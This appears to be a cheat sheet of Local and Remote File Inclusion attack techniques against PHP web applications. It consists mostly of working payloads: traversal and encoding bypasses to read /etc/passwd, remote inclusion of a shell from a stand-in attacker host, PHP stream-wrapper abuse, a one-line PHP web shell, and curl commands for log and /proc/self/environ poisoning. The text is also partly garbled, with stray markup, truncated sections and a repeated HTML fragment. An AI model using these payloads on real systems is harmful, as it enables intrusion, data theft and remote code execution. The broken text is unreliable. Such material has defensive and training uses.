At a Glance
File inclusion is the method for applications, and scripts, to include local or remote files during run-time. The vulnerability occurs when an application generates a path to executable code using an attacker-controlled variable, giving the attacker control over which file is executed.
There are two different types. Local File Inclusion (LFI) where the application includes files on the current server. And Remote File Inclusion (RFI) where the application downloads and execute files from a remote server. 1">

A null byte will make the application ignore the following characters.\nhttp://example.com/index.php?page=../../../etc/passwd%00 Note: PHP fixed the issue in version 5.3.4. https://bugs.php.net/bug.php?id=39863\nDot Truncation In PHP, filenames longer than 4096 bytes will be truncated and, characters after that, ignored.\nhttp://example.com/index.php?page=../../../etc/passwd................[ADD MORE] http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.\\.\\.[ADD MORE] http://example.com/index.php?page=../../../etc/passwd/./././././././.[ADD MORE] http://example.com/index.php?page=../../../[ADD MORE]../../../../../etc/passwd Note: In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/\nEncoding Manipulating variables that reference files with “dot-dot-slash\" (../) sequences and its variations, or using absolute file paths, may allow bypassing poorly implemented input filtering. 3\nURL Double URL UTF-8 Unicode 16 bits Unicode . %2e %252e %c0%2e %e0%40%ae %c0%ae %u002e / %2f %252f %c0%2f %e0%80%af %c0%af %u2215 \\ %2c %252c %c0%5c %c0%80%5c %u2216 Encoded ../ %2e%2e%2f %252e%252e%252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 Encoded ..\\ %2e%2e%2c %252e%252e%252c %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2216 Double URL Encoding http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd UTF-8 Encoding http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd Bypass Filtering http://example.com/index.php?page=....//....//etc/passwd http://example.com/index.php?page=..///////..////..//////etc/passwd http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd Bypass ../ removal ..././ ...\\.\\ Bypass ../ replaced with ; ..;/ http://example.com/page.jsp?include=..;/..;/sensitive.txt Windows UNC Share 4 Windows UNC shares can be injected to redirect access to other resources.\n\\\\localhost\\c$\\windows\\win.ini RFI Most filter bypassing techniques for LFI can be used for RFI.\nBasic RFI http://example.com/index.php?page=http://example.evil/shell.txt Null Byte http://example.com/index.php?page=http://example.evil/shell.txt%00 Bypass http(s):// removal hhttp://thttp://thttp://phttp://:http://http:///http:/// hhttps://thttps://thttps://phttps://shttps://:https:///https:///https:// Bypass allow_url_include On Windows, it is possible to bypass disabled allow_url_include and allow_url_fopen by using SMB. Simply including a script located in an open share.\nhttp://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php PHP Stream Wrappers PHP provides many built-in wrappers for various protocols, to use with file functions such as fopen, copy, file_exists, and filezise. 5\nphp://filter php://filter is a kind of meta-wrapper that allows filtering a stream before the content is read. The resulting data is the encoded version of the given file’s source code.\nNote: Multiple filter chains can be specified on one path, chained using | or /.\nFilter\nstring.rot13. http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php Filter\n[convert.base64] http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php Filter chaining zlib.deflate and\n[convert.base64] http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd Base64 decode and gzip inflate. The resulting encoded string can be decoded and inflated by piping it into the following PHP script:\necho [BASE64-STR] | php -r 'echo gzinflate(base64_decode(file_get_contents(\"php://stdin\")));' zip:// zip:// is a wrapper for zip compression streams. To leverage the zip functionalities, upload a zipped PHP script to the server (with the preferred extension) and decompress in the server using the zip://#, being the resulting decompressed file.\necho -n '\u003c?php system($_GET['c']); ?\u003e' \u003e shell.php zip shell.jpg shell.php http://example.com/index.php?page=zip://shell.jpg%23shell.php data:// data:// is a wrapper for RFC2397, or data:// scheme.

It acts as an interface to internal data structures in the kernel for applications and users.\nBecause of its abstract properties, it is also referred to as a virtual file system.\nFile within this directory are listed as zero bytes in size, even though, can contain a large amount of data. 7\nProcess Directories The /proc directory contains one subdirectory for each process running on the system, which is named after the process ID (PID). Concurrently, each of these directories contains files to store information about the respective process. 8\n/proc/self (\n/fs/proc/self.c) The /proc/self represents the currently scheduled PID. In other words, a symbolic link to the currently running process’s directory.\nIt is a self-referenced device driver, or module, maintained by the Kernel.\nUseful /proc entries /proc/version: Kernel version. /proc/sched_debug: Scheduling information and running processes per CPU. /proc/mounts: Mounted file systems. /proc/net/arp: ARP table. /proc/net/route: Routing table. proc/net/tcp / udp: TCP or UDP active connections. /proc/net/fib_trie: Routing tables trie.9 Useful /proc/[PID] entries /proc/[PID]/cmdline Process invocation command with parameters.\nIt potentially exposes paths, usernames and passwords.\n/proc/[PID]/environ Environment variables.\nIt potentially exposes paths, usernames and passwords.\n/proc/[PID]/cwd Process’ current working directory.\n/proc/[PID]/fd/[#] File descriptors.\nContains one entry for each file which the process has open.\nLFI2RCE - /proc /proc/self/environ /proc/self/environ contains user inputs that turn it in a useful volatile storage. Apache stores an environment variable for the HTTP_USER_AGENT header to be used by the self-contained modules.10\ncurl \"http://example.com/index.php?page=/proc/self/environ\u0026c=id\" -H \"User-Agent\" --data \"\u003c?php system($_GET['c']); ?\u003e\" /proc/[PID]/fd/[FD] 3 Upload A LOT of shells.\nInclude http://example.com/index.php?page=/proc/$PID/fd/$fd.\nBruteforce the process ID ($PID) and file descriptor id ($FD)\nLFI2RCE - Log Poisoning A log file is a file that contains a record of events from an application. A log poisoning attack consists of triggering one of these events with executable code as part of the logged data, and successively, through LFI, include and execute the code.\nNote:\nIt is recommended to first load the target log, not only to verify the access but to identify what data is being stored.\nAdministrators can modify the logged data according to their needs.\nApache By default, Apache maintains access and error logs. The error log, commonly, register the Referer header, while the acccess log, the User-Agent. 11\nAccess Log Make a valid request with the code in the User-Agent header.\ncurl -H 'User-Agent' --data \"\u003c?php system($_GET['c']); ?\u003e\" \"http://example.com\" -v Error Log Make an invalid request, an invalid inclusion for example, with the suitable Referer header.\ncurl -H 'Referer' --data \"\u003c?php system($_GET['c']); ?\u003e\" \"http://example.com/invalid#req\" -v Note:\nThe Apache logging API escapes strings going to the logs.\nUse single quotes (') since double quotes (\") are replaced escaped as \"quote\";\nLFI http://example.com/index.php?page=/path/to/access.log\u0026c=id Common Apache Log Paths Log files can also be set to custom locations, either globally, or domain based if virtual hosting is enabled.\n/var/log/httpd/access_log /var/log/httpd/error_log /var/log/apache/access.log /var/log/apache/error.log /var/log/apache2/access.log /var/log/apache2/error.log /usr/local/apache/log/access_log /usr/local/apache/log/error_log /usr/local/apache2/log/access_log /usr/local/apache2/log/error_log /var/log/nginx/access.log /var/log/nginx/error.log SSH SSH logs the username of each connection.

<p>The <code>proc</code> file system (<code>procfs</code>) contains a hierarchy of special files that represent the current state of the kernel. It acts as an interface to internal data structures in the kernel for applications and users.</p>
<p>Because of its abstract properties, it is also referred to as a <a href="https://en.wikipedia.org/wiki/Virtual_file_system">virtual file system</a>.</p>

<p><strong>Note:</strong></p>
